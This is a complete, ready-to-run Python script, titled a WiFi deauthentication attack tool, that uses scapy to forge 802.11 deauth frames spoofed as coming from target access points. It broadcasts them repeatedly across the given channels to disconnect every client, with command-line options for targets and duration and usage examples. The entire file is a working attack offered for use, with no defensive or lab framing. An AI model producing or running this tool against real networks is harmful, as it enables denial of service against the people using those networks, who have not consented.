#!/usr/bin/env python3
"""
WiFi Deauth Attack Tool
"""

import sys
import time
import os
import argparse
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap

def set_channel(interface, channel):
    """
    Set the channel for a wireless interface
    """
    try:
        result = os.system(f'iw dev {interface} set channel {channel} 2>/dev/null')
        if result == 0:
            #print(f"Set {interface} to channel {channel}")
            time.sleep(0.01)  # Small delay to ensure channel is set
            return True
        
    except:
        print(f"Warning: Could not set channel {channel}")
        return False

def deauth_attack(interface, ap_targets, duration=10):
    """
    Perform deauthentication attack on target APs
    
    Args:
        interface: Wireless interface in monitor mode
        ap_targets: List of (bssid, channel) tuples
        duration: Attack duration in seconds (default: 10)
    """
    
    # Create deauth packets for each AP
    packets = []
    for bssid, channel in ap_targets:
        # Standard deauth packet structure
        packet = (
            RadioTap() /                    # RadioTap header for monitor mode
            Dot11(
                type=0, subtype=12,         # Management frame: Deauthentication
                addr1="ff:ff:ff:ff:ff:ff",  # Destination: Broadcast (all clients)
                addr2=bssid,                # Source: Target AP
                addr3=bssid                 # BSSID: Target AP
            ) /
            Dot11Deauth(reason=7)           # Reason: Class 3 frame from non-associated station
        )
        packets.append((packet, bssid, channel))
    
    print("WiFi Deauthentication Attack")
    print("=" * 60)
    # Display targets
    for i, (bssid, channel) in enumerate(ap_targets, 1):
        print(f"Target {i}: {bssid.upper()} (Channel {channel})")
    print(f"Interface: {interface}")
    print(f"Duration: {duration} seconds")
    print("\nPacket Details:")
    for i, (packet, bssid, channel) in enumerate(packets, 1):
        dot11 = packet[Dot11]
        deauth = packet[Dot11Deauth]
        print(f"  Packet {i} -> Target: {bssid.upper()}")
        print(f"    Type: {dot11.type} (Management), Subtype: {dot11.subtype} (Deauth)")
        print(f"    From: {dot11.addr2} To: {dot11.addr1} (Broadcast)")
        print(f"    BSSID: {dot11.addr3}")
        print(f"    Channel: {channel}")
        print(f"    Reason Code: {deauth.reason} (Class 3 frame from non-associated station)")
        if i < len(packets):
            print()
    print("-" * 60)

    # Attack loop
    try:
        start_time = time.time()
        packet_count = 0
        
        while time.time() - start_time < duration:
            
            # Send packets to each target
            for packet, bssid, channel in packets:
                set_channel(interface, channel)
                sendp(packet, iface=interface, verbose=0)  # Send packet
                packet_count += 1

                time.sleep(0.01)  # Small delay to avoid overwhelming the interface

            # Progress update every 10 packets
            if packet_count % 10 == 0:
                elapsed = time.time() - start_time
                print(f"Sent {packet_count} packets in {elapsed:.1f}s")
        
        # Final results
        total_time = time.time() - start_time
        print(f"\nCompleted: {packet_count} packets sent in {total_time:.1f} seconds | Targets: {len(ap_targets)}")
        
    except KeyboardInterrupt:
        elapsed = time.time() - start_time
        print(f"\nStopped: {packet_count} packets sent in {elapsed:.1f} seconds")

def main():
    # Show usage if no arguments provided
    if len(sys.argv) == 1:
        sys.argv.append('-h')
    
    parser = argparse.ArgumentParser(
        description='WiFi Deauthentication Attack Tool',
        epilog='''
Examples:
  Single AP:   %(prog)s -i wlan0 -t 00:11:22:33:44:55:6
  Multiple APs: %(prog)s -i wlan0 -t 00:11:22:33:44:55:6 aa:bb:cc:dd:ee:ff:11
  
Target format: BSSID:CHANNEL (e.g., 00:11:22:33:44:55:6)
        ''',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument('-i', '--interface', required=True,
                       help='Monitor mode interface (e.g., wlan0)')
    parser.add_argument('-t', '--targets', nargs='+', required=True,
                       help='Targets in BSSID:CHANNEL format')
    parser.add_argument('-d', '--duration', type=float, default=10,
                       help='Attack duration in seconds (default: 10)')
    
    args = parser.parse_args()
    
    # Parse targets
    ap_targets = []
    for target in args.targets:
        try:
            bssid, channel = target.rsplit(':', 1)
            if bssid.count(':') != 5:
                raise ValueError("Invalid BSSID format")
            ap_targets.append((bssid, int(channel)))
        except ValueError:
            print(f"Error: Invalid target format '{target}'")
            print("Use format: AA:BB:CC:DD:EE:FF:CHANNEL")
            sys.exit(1)
    
    # Execute attack
    deauth_attack(args.interface, ap_targets, args.duration)

if __name__ == "__main__":
    main()
